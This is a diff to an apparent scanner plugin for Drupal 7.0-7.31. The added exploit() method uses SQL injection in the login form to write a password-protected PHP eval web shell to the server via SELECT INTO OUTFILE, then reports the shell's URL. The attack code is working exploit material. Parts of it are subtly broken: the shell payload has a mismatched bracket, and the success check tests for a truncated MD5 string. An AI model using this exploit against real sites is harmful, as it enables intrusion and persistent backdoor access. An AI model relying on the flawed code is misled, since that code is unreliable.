@@ -11,13 +11,13 @@ class Vuln(ABVuln):
     name = 'Drupal /index.php getshell'  # 漏洞名称
     level = VulnLevel.LOW  # 漏洞危害级别
     type = VulnType.RCE  # 漏洞类型
-    disclosure_date = ''  # 漏洞公布时间
+    disclosure_date = 'Unkonwn'  # 漏洞公布时间
     desc = '''
         Drupal 7.0-7.31 index.php getshell.
     '''  # 漏洞描述
-    ref = ''    # 漏洞来源
-    cnvd_id = ''    # cnvd漏洞编号
-    cve_id = ''    # cve编号
+    ref = 'Unkonwn'    # 漏洞来源
+    cnvd_id = 'Unkonwn'    # cnvd漏洞编号
+    cve_id = 'Unkonwn'    # cve编号
     product = 'Drupal'  # 漏洞应用名称
     product_version = '7.0-7.31'  # 漏洞应用版本
 
@@ -37,7 +37,7 @@ class Poc(ABPoc):
 
             hh = hackhttp.hackhttp()
             payload = '?q=node&destination=node'
-            filename = 'shell' + str(random.randint(1,10000000000)) + '.php'
+            filename = '/shell' + str(random.randint(1,10000000000)) + '.php'
             target = self.target + payload
             post1 = "name[0%20;select%20'<?php%20print(md5(1))?>'%20into%20outfile%20'test5.php';#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
             code, head, body, errcode, final_url = hh.http(target, post=post1)
@@ -45,7 +45,7 @@ class Poc(ABPoc):
             if (len(res) == 0):
                 return 
             path = res[0]
-            post2 = "name[0%20;select%20'<?php%20print(md5(1))?>'%20into%20outfile%20'"+path+filename+"';#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
+            post2 = "name[0%20;select%20'<?php%20print(md5(1))?>'%20into%20outfile%20'" + path + filename + "';#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
             code, head, body, errcode, final_url = hh.http(target, post=post2);
             target2 = self.target + filename
             code, head, body, errcode, final_url = hh.http(target2)
@@ -59,7 +59,33 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        super(Poc, self).exploit()
+        try:
+            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
+                target=self.target, vuln=self.vuln))
+
+            hh = hackhttp.hackhttp()
+            payload = '?q=node&destination=node'
+            filename = '/shell' + str(random.randint(1,10000000000)) + '.php'
+            target = self.target + payload
+            post1 = "name[0%20;select%20'<?php%20print(md5(1))?>'%20into%20outfile%20'test5.php';#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
+            code, head, body, errcode, final_url = hh.http(target, post=post1)
+            res = re.findall('line.+of.+>([^<>]+)includes/unicode.inc', body)
+            if (len(res) == 0):
+                return 
+            path = res[0]
+            #getshell
+            post2 = "name[0%20;select%20'<?php @eval($_POST[c);?>'%20into%20outfile%20'" + path + filename + "';#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
+            code, head, body, errcode, final_url = hh.http(target, post=post2);
+            target2 = self.target + filename
+            code, head, body, errcode, final_url = hh.http(target2)
+
+            if 'c4ca4238a0b923820dcc509a6f75849' in body:
+                #security_hole(target+' ==getshell>> '+target2)
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
+                    target=self.target, name=self.vuln.name, url=target2))
+
+        except Exception, e:
+            self.output.info('执行异常{}'.format(e))
 
 if __name__ == '__main__':
     Poc().run()
